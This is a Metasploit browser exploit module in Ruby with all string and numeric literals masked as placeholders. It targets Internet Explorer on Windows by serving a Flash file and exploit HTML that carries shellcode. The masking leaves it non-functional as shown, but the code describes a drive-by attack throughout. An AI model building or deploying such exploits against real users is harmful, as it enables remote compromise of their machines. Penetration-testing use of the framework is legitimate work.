require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: BrowserExploitServer def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <int> , <str> = > true } , <str> = > { <str> = > <str> , <str> = > false } , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > [ { <str> : <str> , method : <str> } ] , <str> = > OperatingSystems :: Match :: WINDOWS , <str> = > Msf :: HttpClients :: IE , <str> = > lambda { | ver | ver =~ <str> } } , <str> = > [ [ <str> , { } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) end def exploit @swf = create_swf super end def on_request_exploit ( cli , request , target_info ) print_status ( <str> request . uri <str> ) if request . uri =~ <str> print_status ( <str> ) send_response ( cli , @swf , { <str> = > <str> , <str> = > <str> } ) return end print_status ( <str> ) tag = retrieve_tag ( cli , request ) profile = browser_profile [ tag ] profile [ <str> ] = false unless profile . nil? send_exploit_html ( cli , exploit_template ( cli , target_info ) , { <str> = > <str> } ) end def exploit_template ( cli , target_info ) swf_random = <str> rand_text_alpha ( <int> + rand ( <int> ) ) <str> shellcode = get_payload ( cli , target_info ) . unpack ( <str> ) [ <int> ] html_template = <str> return html_template , binding ( ) end def create_swf path = :: File . join ( Msf :: Config . data_directory , <str> , <str> , <str> ) swf = :: File . open ( path , <str> ) { | f | swf = f . read } swf end end 
